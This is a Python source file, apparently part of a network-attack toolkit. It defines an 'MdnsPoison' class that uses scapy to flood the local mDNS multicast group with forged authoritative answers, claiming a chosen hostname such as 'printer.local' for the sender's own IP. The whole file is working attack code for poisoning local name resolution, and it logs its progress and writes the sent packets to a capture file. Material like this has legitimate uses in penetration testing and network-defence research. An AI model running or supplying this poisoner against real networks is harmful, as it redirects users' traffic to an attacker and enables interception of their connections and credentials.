import time
from scapy.all import Ether, IP, UDP, DNS, DNSRR, sendp, get_if_hwaddr, get_if_addr
from attacks.base import BaseAttack


class MdnsPoison(BaseAttack):
    def run(self):
        spoof_name  = self.params.get("spoof_name", "printer.local")
        count       = int(self.params.get("count", 200))
        attacker_ip = get_if_addr(self.iface)
        src_mac     = get_if_hwaddr(self.iface)

        MDNS_MCAST  = "224.0.0.251"
        MDNS_PORT   = 5353
        MDNS_MAC    = "01:00:5e:00:00:fb"

        self.log(f"mDNS Poison: claiming '{spoof_name}' → {attacker_ip}", "warn")
        writer = self.open_pcap()
        sent   = 0

        while not self._stop.is_set():
            if count and sent >= count:
                break
            pkt = (
                Ether(src=src_mac, dst=MDNS_MAC)
                / IP(src=attacker_ip, dst=MDNS_MCAST, ttl=255)
                / UDP(sport=MDNS_PORT, dport=MDNS_PORT)
                / DNS(
                    id=0, qr=1, aa=1, rd=0,
                    qdcount=0, ancount=1,
                    an=DNSRR(
                        rrname=spoof_name, type="A",
                        rclass=0x8001, ttl=120, rdata=attacker_ip,
                    ),
                )
            )
            try:
                sendp(pkt, iface=self.iface, verbose=False)
                self.write(pkt)
                sent += 1
                if sent % 50 == 0:
                    self.log(f"mDNS Poison: {sent} responses sent", "info")
            except Exception as e:
                self.log(f"mDNS error: {e}", "error"); break
            time.sleep(0.1)

        writer.close()
        self.log(f"mDNS Poison stopped — {sent} responses sent", "success")
